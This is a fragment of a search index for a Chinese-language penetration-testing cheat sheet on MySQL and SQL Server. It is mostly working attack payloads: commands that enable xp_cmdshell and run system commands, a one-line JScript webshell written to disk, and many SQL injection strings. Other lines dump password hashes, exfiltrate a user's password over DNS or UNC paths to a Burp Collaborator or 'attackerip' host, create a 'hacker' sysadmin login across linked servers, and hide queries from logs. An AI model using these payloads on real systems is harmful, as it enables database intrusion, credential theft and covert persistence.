>H:/work/target1.txt mysql -uroot -e \"show databases;\" >1.txt","title":"\u4e0d\u767b\u5f55\u6267\u884c sql"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mysql/#_3","text":"\u663e\u793a\u7248\u672c: select version(); \u663e\u793a\u5b57\u7b26\u96c6: select @@character_set_database; \u663e\u793a\u6570\u636e\u5e93: show databases; \u663e\u793a\u8868\u540d: show tables; \u663e\u793a\u5b57\u6bb5: show columns from table_name; \u663e\u793a\u8ba1\u7b97\u673a\u540d: select @@hostname; \u7cfb\u7edf\u7248\u672c: select @@version_compile_os; mysql\u8def\u5f84: select @@basedir; \u6570\u636e\u5e93\u8def\u5f84: select @@datadir; describe describe table_name; \u663e\u793aroot\u5bc6\u7801: select User,Password from mysql.user; \u5bfc\u5165\u6587\u4ef6: select load_fie(0x633A5C5C77696E646F77735C73797374656D33325C5C696E65747372765C5C6D657461626173652E786D6C); \u5bfc\u51fa\u6587\u4ef6: select 'testtest' into outfile '/var/www/html/test.txt' from mysql.user; \u5f00\u542f\u5916\u8fde: GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION; mysql\u5b89\u88c5\u8def\u5f84: show variables; \u66f4\u65b0\u6570\u636e\u5e93: UPDATE `DX15`.`dx15_common_member` SET `uid` = '1' WHERE `dx15_common_member`.`uid` =40407;\u66f4\u65b040407uid\u53d8\u6210uid1 mysql\u66f4\u6539root\u5bc6\u7801: mysqladmin -u root password \"newpwd\"; \u67e5\u8be2\u8868: select concat(User,0x3a,Password) from mysql.user; \u83b7\u53d6\u6570\u636e\u5e93\u6240\u6709\u8868: SHOW TABLES FROM `databases`; \u83b7\u53d6\u5217\u524d20\u884c: SELECT * FROM `admin_bbs` ORDER BY 1 DESC LIMIT 0,20; \u83b7\u53d6\u8868\u884c\u6570: SELECT COUNT(*) AS CNT FROM `dede_admin`;","title":"\u57fa\u7840\u547d\u4ee4"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/","text":"sql server \u76f8\u5173\u5de5\u5177\uff1a MDUT SharpSQLTools MAT xp_cmdshell SQL Server 2005 \u4e4b\u524d\u7248\u672c\uff0cxp_cmdshell \u9ed8\u8ba4\u5f00\u542f: exec master..xp_cmdshell 'whoami'; \u5224\u65ad\u662f\u5426\u5b58\u5728 xp_cmdshell \u5b58\u50a8\u8fc7\u7a0b\uff0c\u8fd4\u56de1\u8868\u793a\u5b58\u5728\uff0c\u5426\u5219\u8868\u793a\u4e0d\u5b58\u5728: select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'; \u5220\u9664 xp_cmdshell: exec master..sp_dropextendedproc xp_cmdshell; \u6062\u590d xp_cmdshell: exec master..xp_dropextendedproc xp_cmdshell,@dllname='xplog70.dll' declare @o int; SQL Server 2005\u4e4b\u540e\u7684\u7248\u672c\u4e2d\uff0cxp_cmdshell \u9ed8\u8ba4\u5173\u95ed\uff0c\u9700\u8981\u624b\u52a8\u5f00\u542f\uff0c\u5f00\u542fxp_cmdshell\u9700\u8981sa\u6743\u9650: # \u5141\u8bb8\u4fee\u6539\u9ad8\u7ea7\u53c2\u6570 exec sp_configure 'show advanced options',1; # \u914d\u7f6e\u751f\u6548 RECONFIGURE; # \u5f00\u542fxp_cmdshell exec sp_configure 'xp_cmdshell',1; # \u914d\u7f6e\u751f\u6548 RECONFIGURE; # \u68c0\u67e5\u662f\u5426\u5f00\u542f exec sp_configure; # \u6267\u884c\u7cfb\u7edf\u547d\u4ee4 exec master..xp_cmdshell 'whoami'; # \u83b7\u53d6webshell exec master..xp_cmdshell 'echo ^<%@ Page Language=\"Jscript\"%^>^<%eval(Request.Item[\"pass\"],\"unsafe\");%^> > c:\\\\WWW\\\\test.aspx' MSSQL \u9ed8\u8ba4\u6570\u636e\u5e93 Name \u63cf\u8ff0 pubs \u5728 MSSQL 2005 \u4e2d\u4e0d\u53ef\u7528 model \u5728\u6240\u6709\u7248\u672c\u4e2d\u53ef\u7528 msdb \u5728\u6240\u6709\u7248\u672c\u4e2d\u53ef\u7528 tempdb \u5728\u6240\u6709\u7248\u672c\u4e2d\u53ef\u7528 northwind \u5728\u6240\u6709\u7248\u672c\u4e2d\u53ef\u7528 information_schema \u4ece MSSQL 2000 \u53ca\u66f4\u9ad8\u7248\u672c\u5f00\u59cb\u53ef\u7528 MSSQL \u6ce8\u91ca Type \u63cf\u8ff0 /* MSSQL Comment */ C-style \u6ce8\u91ca -- - SQL \u6ce8\u91ca ;%00 Null byte MSSQL \u7528\u6237 SELECT CURRENT_USER SELECT user_name(); SELECT system_user; SELECT user; MSSQL \u7248\u672c\u67e5\u770b SELECT @@version MSSQL \u4e3b\u673a\u540d SELECT HOST_NAME() SELECT @@hostname SELECT @@SERVERNAME SELECT SERVERPROPERTY('productversion') SELECT SERVERPROPERTY('productlevel') SELECT SERVERPROPERTY('edition'); MSSQL \u6570\u636e\u5e93\u540d SELECT DB_NAME() MSSQL \u6570\u636e\u5e93\u51ed\u8bc1 MSSQL 2000 : Hashcat mode 131: 0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578 sql SELECT name, password FROM master..sysxlogins SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins -- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer MSSQL 2005 : Hashcat mode 132: 0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe sql SELECT name, password_hash FROM master.sys.sql_logins SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins MSSQL \u5217\u51fa\u6570\u636e\u5e93 SELECT name FROM master..sysdatabases; SELECT DB_NAME(N); \u2014 for N = 0, 1, 2, \u2026 SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; -- Change delimeter value such as ', ' to anything else you want => master, tempdb, model, msdb (Only works in MSSQL 2017+) MSSQL \u5217\u51fa\u5217 SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = \u2018mytable\u2019); \u2014 for the current DB only SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=\u2019sometable\u2019; \u2014 list colum names and types for master..sometable SELECT table_catalog, column_name FROM information_schema.columns MSSQL \u5217\u51fa\u8868 SELECT name FROM master..sysobjects WHERE xtype = \u2018U\u2019; \u2014 use xtype = \u2018V\u2019 for views SELECT name FROM someotherdb..sysobjects WHERE xtype = \u2018U\u2019; SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=\u2019sometable\u2019; \u2014 list colum names and types for master..sometable SELECT table_catalog, table_name FROM information_schema.columns SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U'; -- Change delimeter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options (Only works in MSSQL 2017+) MSSQL \u8054\u5408\u6ce8\u5165 -- extract databases names $ SELECT name FROM master..sysdatabases [*] Injection [*] msdb [*] tempdb -- extract tables from Injection database $ SELECT name FROM Injection..sysobjects WHERE xtype = 'U' [*] Profiles [*] Roles [*] Users -- extract columns for the table Users $ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users') [*] UserId [*] UserName -- Finally extract the data $ SELECT UserId, UserName from Users MSSQL \u62a5\u9519\u6ce8\u5165 For integer inputs : convert(int,@@version) For integer inputs : cast((SELECT @@version) as int) For string inputs : ' + convert(int,@@version) + ' For string inputs : ' + cast((SELECT @@version) as int) + ' MSSQL \u76f2\u6ce8 AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- - AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97 AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A' AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90 SELECT @@version WHERE @@version LIKE '%12.0.2000.8%' WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table) SELECT message FROM data WHERE row = 1 and message like 't%' MSSQL \u65f6\u95f4\u6ce8\u5165 ProductID=1;waitfor delay '0:0:10'-- ProductID=1);waitfor delay '0:0:10'-- ProductID=1';waitfor delay '0:0:10'-- ProductID=1');waitfor delay '0:0:10'-- ProductID=1));waitfor delay '0:0:10'-- IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]' IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0'; MSSQL \u5806\u6808\u67e5\u8be2 Without any statement terminator ```sql -- multiple SELECT statements SELECT 'A'SELECT 'B'SELECT 'C' -- updating password with a stacked query SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')-- -- using the stacked query to enable xp_cmdshell -- you won't have the output of the query, redirect it to a file SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')-- ``` Use a semi-colon \";\" to add another query sql ProductID=1; DROP members-- MSSQL \u8bfb\u53d6\u6587\u4ef6 Permissions : The BULK option requires the ADMINISTER BULK OPERATIONS or the ADMINISTER DATABASE BULK OPERATIONS permission. -1 union select null,(select x from OpenRowset(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) R(x)),null,null MSSQL \u547d\u4ee4\u6267\u884c EXEC xp_cmdshell \"net user\"; EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'; EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1'; \u91cd\u65b0\u6fc0\u6d3b xp_cmdshell\uff08\u5728 SQL Server 2005 \u4e2d\u9ed8\u8ba4\u7981\u7528\uff09 EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; \u4e0e MSSQL \u5b9e\u4f8b\u4ea4\u4e92\u3002 sqsh -S 192.168.1.X -U sa -P superPassword python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758 \u6267\u884c Python \u811a\u672c \u7531\u4e0e\u4f7f\u7528 xp_cmdshell \u6267\u884c\u547d\u4ee4\u7684\u7528\u6237\u4e0d\u540c\u7684\u7528\u6237\u6267\u884c #Print the user being used (and execute commands) EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"getpass\").getuser())' EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"os\").system(\"whoami\"))' #Open and read a file EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open(\"C:\\\\inetpub\\\\wwwroot\\\\web.config\", \"r\").read())' #Multiline EXECUTE sp_execute_external_script @language = N'Python', @script = N' import sys print(sys.version) ' GO MSSQL \u5916\u5e26\u6570\u636e MSSQL DNS \u5916\u5e26\u6570\u636e Technique from https://twitter.com/ptswarm/status/1313476695295512578/photo/1 # Permissions: Requires VIEW SERVER STATE permission on the server. 1 and exists(select * from fn_xe_file_target_read_file('C:\\*.xel','\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\1.xem',null,null)) # Permissions: Requires the CONTROL SERVER permission. 1 (select 1 where exists(select * from fn_get_audit_file('\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\',default,default))) 1 and exists(select * from fn_trace_gettable('\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\1.trc',default)) MSSQL UNC \u8def\u5f84 MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the xp_dirtree function to list the files in our SMB share and grab the NTLMv2 hash. 1'; use master; exec xp_dirtree '\\\\10.10.15.XX\\SHARE';-- xp_dirtree '\\\\attackerip\\file' xp_fileexist '\\\\attackerip\\file' BACKUP LOG [TESTING] TO DISK = '\\\\attackerip\\file' BACKUP DATABASE [TESTING] TO DISK = '\\\\attackeri\\file' RESTORE LOG [TESTING] FROM DISK = '\\\\attackerip\\file' RESTORE DATABASE [TESTING] FROM DISK = '\\\\attackerip\\file' RESTORE HEADERONLY FROM DISK = '\\\\attackerip\\file' RESTORE FILELISTONLY FROM DISK = '\\\\attackerip\\file' RESTORE LABELONLY FROM DISK = '\\\\attackerip\\file' RESTORE REWINDONLY FROM DISK = '\\\\attackerip\\file' RESTORE VERIFYONLY FROM DISK = '\\\\attackerip\\file' MSSQL \u63d0\u5347\u6743\u9650\u4e3a DB \u7ba1\u7406\u5458 EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin; MSSQL \u53d7\u4fe1\u4efb\u94fe\u63a5 The links between databases work even across forest trusts. msf> use exploit/windows/mssql/mssql_linkcrawler [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter sessio Manual exploitation -- find link select * from master..sysservers -- execute query through the link select * from openquery(\"dcorp-sql1\", 'select * from master..sysservers') select version from openquery(\"linkedserver\", 'select @@version as version'); -- chain multiple openquery select version from openquery(\"link1\",'select version from openquery(\"link2\",\"select @@version as version\")') -- execute shell commands EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer select 1 from openquery(\"linkedserver\",'select 1;exec master..xp_cmdshell \"dir c:\"') -- create user and give admin privileges EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\" EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\" \u5217\u51fa\u6743\u9650 \u5217\u51fa\u5f53\u524d\u7528\u6237\u5728\u670d\u52a1\u5668\u4e0a\u7684\u6709\u6548\u6743\u9650\u3002 SELECT * FROM fn_my_permissions(NULL, 'SERVER'); \u5217\u51fa\u5f53\u524d\u7528\u6237\u5728\u6570\u636e\u5e93\u4e0a\u7684\u6709\u6548\u6743\u9650\u3002 SELECT * FROM fn_my_permissions (NULL, 'DATABASE'); \u5217\u51fa\u5f53\u524d\u7528\u6237\u5728\u89c6\u56fe\u4e0a\u7684\u6709\u6548\u6743\u9650\u3002 SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name; \u68c0\u67e5\u5f53\u524d\u7528\u6237\u662f\u5426\u5c5e\u4e8e\u6307\u5b9a\u7684\u670d\u52a1\u5668\u89d2\u8272\u3002 -- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin SELECT is_srvrolemember('sysadmin'); MSSQL OPSEC \u5728\u67e5\u8be2\u4e2d\u4f7f\u7528 SP_PASSWORD \u4ee5\u9690\u85cf\u65e5\u5fd7\uff0c\u5982\uff1a ' AND 1=1--sp_password -- 'sp_password' was found in the text of this event. -- The text has been replaced with this comment for security reasons. References \u6ce8\uff1a\u5927\u90e8\u5206\u5185\u5bb9\u7ffb\u8bd1\u81f3\uff1a https://github.com/swisskyrepo/PayloadsAllTheThings MSSQL\u6e17\u900f\u6d4b\u8bd5 Pentest Monkey - mssql-sql-injection-cheat-sheet Error Based - SQL Injection MSSQL Trusted Links - HackTricks.xyz SQL Server \u2013 Link\u2026 Link\u2026 Link\u2026 and Shell: How to Hack Database Links in SQL Server! - Antti Rantasaari - June 6th, 2013 DAFT: Database Audit Framework & Toolkit - NetSPI SQL Server UNC Path Injection Cheatsheet - nullbind Full MSSQL Injection PWNage - ZeQ3uL && JabAv0C - 28 January 2009 Microsoft - sys.fn_my_permissions (Transact-SQL) Microsoft - IS_SRVROLEMEMBER (Transact-SQL) AWS WAF Clients Left Vulnerable to SQL Injection Due to Unorthodox MSSQL Design Choice - Marc Olivier Bergeron - Jun 21, 2023","title":"sql server"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#sql-server","text":"\u76f8\u5173\u5de5\u5177\uff1a MDUT SharpSQLTools MAT","title":"sql server"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#xp_cmdshell","text":"SQL Server 2005 \u4e4b\u524d\u7248\u672c\uff0cxp_cmdshell \u9ed8\u8ba4\u5f00\u542f: exec master..xp_cmdshell 'whoami'; \u5224\u65ad\u662f\u5426\u5b58\u5728 xp_cmdshell \u5b58\u50a8\u8fc7\u7a0b\uff0c\u8fd4\u56de1\u8868\u793a\u5b58\u5728\uff0c\u5426\u5219\u8868\u793a\u4e0d\u5b58\u5728: select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'; \u5220\u9664 xp_cmdshell: exec master..sp_dropextendedproc xp_cmdshell; \u6062\u590d xp_cmdshell: exec master..xp_dropextendedproc xp_cmdshell,@dllname='xplog70.dll' declare @o int; SQL Server 2005\u4e4b\u540e\u7684\u7248\u672c\u4e2d\uff0cxp_cmdshell \u9ed8\u8ba4\u5173\u95ed\uff0c\u9700\u8981\u624b\u52a8\u5f00\u542f\uff0c\u5f00\u542fxp_cmdshell\u9700\u8981sa\u6743\u9650: # \u5141\u8bb8\u4fee\u6539\u9ad8\u7ea7\u53c2\u6570 exec sp_configure 'show advanced options',1; # \u914d\u7f6e\u751f\u6548 RECONFIGURE; # \u5f00\u542fxp_cmdshell exec sp_configure 'xp_cmdshell',1; # \u914d\u7f6e\u751f\u6548 RECONFIGURE; # \u68c0\u67e5\u662f\u5426\u5f00\u542f exec sp_configure; # \u6267\u884c\u7cfb\u7edf\u547d\u4ee4 exec master..xp_cmdshell 'whoami'; # \u83b7\u53d6webshell exec master..xp_cmdshell 'echo ^<%@ Page Language=\"Jscript\"%^>^<%eval(Request.Item[\"pass\"],\"unsafe\");%^> > c:\\\\WWW\\\\test.aspx'","title":"xp_cmdshell"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#mssql","text":"Name \u63cf\u8ff0 pubs \u5728 MSSQL 2005 \u4e2d\u4e0d\u53ef\u7528 model \u5728\u6240\u6709\u7248\u672c\u4e2d\u53ef\u7528 msdb \u5728\u6240\u6709\u7248\u672c\u4e2d\u53ef\u7528 tempdb \u5728\u6240\u6709\u7248\u672c\u4e2d\u53ef\u7528 northwind \u5728\u6240\u6709\u7248\u672c\u4e2d\u53ef\u7528 information_schema \u4ece MSSQL 2000 \u53ca\u66f4\u9ad8\u7248\u672c\u5f00\u59cb\u53ef\u7528","title":"MSSQL \u9ed8\u8ba4\u6570\u636e\u5e93"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#mssql_1","text":"Type \u63cf\u8ff0 /* MSSQL Comment */ C-style \u6ce8\u91ca -- - SQL \u6ce8\u91ca ;%00 Null byte","title":"MSSQL \u6ce8\u91ca"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#mssql_2","text":"SELECT CURRENT_USER SELECT user_name(); SELECT system_user; SELECT user;","title":"MSSQL \u7528\u6237"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#mssql_3","text":"SELECT @@version","title":"MSSQL \u7248\u672c\u67e5\u770b"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#mssql_4","text":"SELECT HOST_NAME() SELECT @@hostname SELECT @@SERVERNAME SELECT SERVERPROPERTY('productversion') SELECT SERVERPROPERTY('productlevel') SELECT SERVERPROPERTY('edition');","title":"MSSQL \u4e3b\u673a\u540d"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#mssql_5","text":"SELECT DB_NAME()","title":"MSSQL \u6570\u636e\u5e93\u540d"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#mssql_6","text":"MSSQL 2000 : Hashcat mode 131: 0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578 sql SELECT name, password FROM master..sysxlogins SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins -- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer MSSQL 2005 : Hashcat mode 132: 0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe sql SELECT name, password_hash FROM master.sys.sql_logins SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins","title":"MSSQL \u6570\u636e\u5e93\u51ed\u8bc1"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#mssql_7","text":"SELECT name FROM master..sysdatabases; SELECT DB_NAME(N); \u2014 for N = 0, 1, 2, \u2026 SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; -- Change delimeter value such as ', ' to anything else you want => master, tempdb, model, msdb (Only works in MSSQL 2017+)","title":"MSSQL \u5217\u51fa\u6570\u636e\u5e93"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#mssql_8","text":"SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = \u2018mytable\u2019); \u2014 for the current DB only SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=\u2019sometable\u2019; \u2014 list colum names and types for master..sometable SELECT table_catalog, column_name FROM information_schema.columns","title":"MSSQL \u5217\u51fa\u5217"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#mssql_9","text":"SELECT name FROM master..sysobjects WHERE xtype = \u2018U\u2019; \u2014 use xtype = \u2018V\u2019 for views SELECT name FROM someotherdb..sysobjects WHERE xtype = \u2018U\u2019; SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=\u2019sometable\u2019; \u2014 list colum names and types for master..sometable SELECT table_catalog, table_name FROM information_schema.columns SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U'; -- Change delimeter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options (Only works in MSSQL 2017+)","title":"MSSQL \u5217\u51fa\u8868"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#mssql_10","text":"-- extract databases names $ SELECT name FROM master..sysdatabases [*] Injection [*] msdb [*] tempdb -- extract tables from Injection database $ SELECT name FROM Injection..sysobjects WHERE xtype = 'U' [*] Profiles [*] Roles [*] Users -- extract columns for the table Users $ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users') [*] UserId [*] UserName -- Finally extract the data $ SELECT UserId, UserName from Users","title":"MSSQL \u8054\u5408\u6ce8\u5165"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#mssql_11","text":"For integer inputs : convert(int,@@version) For integer inputs : cast((SELECT @@version) as int) For string inputs : ' + convert(int,@@version) + ' For string inputs : ' + cast((SELECT @@version) as int) + '","title":"MSSQL \u62a5\u9519\u6ce8\u5165"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#mssql_12","text":"AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- - AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97 AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A' AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90 SELECT @@version WHERE @@version LIKE '%12.0.2000.8%' WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table) SELECT message FROM data WHERE row = 1 and message like 't%'","title":"MSSQL \u76f2\u6ce8"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#mssql_13","text":"ProductID=1;waitfor delay '0:0:10'-- ProductID=1);waitfor delay '0:0:10'-- ProductID=1';waitfor delay '0:0:10'-- ProductID=1');waitfor delay '0:0:10'-- ProductID=1));waitfor delay '0:0:10'-- IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]' IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';","title":"MSSQL \u65f6\u95f4\u6ce8\u5165"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#mssql_14","text":"Without any statement terminator ```sql -- multiple SELECT statements SELECT 'A'SELECT 'B'SELECT 'C' -- updating password with a stacked query SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')-- -- using the stacked query to enable xp_cmdshell -- you won't have the output of the query, redirect it to a file SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')-- ``` Use a semi-colon \";\" to add another query sql ProductID=1; DROP members--","title":"MSSQL \u5806\u6808\u67e5\u8be2"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#mssql_15","text":"Permissions : The BULK option requires the ADMINISTER BULK OPERATIONS or the ADMINISTER DATABASE BULK OPERATIONS permission. -1 union select null,(select x from OpenRowset(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) R(x)),null,null","title":"MSSQL \u8bfb\u53d6\u6587\u4ef6"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#mssql_16","text":"EXEC xp_cmdshell \"net user\"; EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'; EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1'; \u91cd\u65b0\u6fc0\u6d3b xp_cmdshell\uff08\u5728 SQL Server 2005 \u4e2d\u9ed8\u8ba4\u7981\u7528\uff09 EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; \u4e0e MSSQL \u5b9e\u4f8b\u4ea4\u4e92\u3002 sqsh -S 192.168.1.X -U sa -P superPassword python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758 \u6267\u884c Python \u811a\u672c \u7531\u4e0e\u4f7f\u7528 xp_cmdshell \u6267\u884c\u547d\u4ee4\u7684\u7528\u6237\u4e0d\u540c\u7684\u7528\u6237\u6267\u884c #Print the user being used (and execute commands) EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"getpass\").getuser())' EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"os\").system(\"whoami\"))' #Open and read a file EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open(\"C:\\\\inetpub\\\\wwwroot\\\\web.config\", \"r\").read())' #Multiline EXECUTE sp_execute_external_script @language = N'Python', @script = N' import sys print(sys.version) ' GO","title":"MSSQL \u547d\u4ee4\u6267\u884c"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#mssql_17","text":"","title":"MSSQL \u5916\u5e26\u6570\u636e"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#mssql-dns","text":"Technique from https://twitter.com/ptswarm/status/1313476695295512578/photo/1 # Permissions: Requires VIEW SERVER STATE permission on the server. 1 and exists(select * from fn_xe_file_target_read_file('C:\\*.xel','\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\1.xem',null,null)) # Permissions: Requires the CONTROL SERVER permission. 1 (select 1 where exists(select * from fn_get_audit_file('\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\',default,default))) 1 and exists(select * from fn_trace_gettable('\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\1.trc',default))","title":"MSSQL DNS \u5916\u5e26\u6570\u636e"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#mssql-unc","text":"MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the xp_dirtree function to list the files in our SMB share and grab the NTLMv2 hash. 1'; use master; exec xp_dirtree 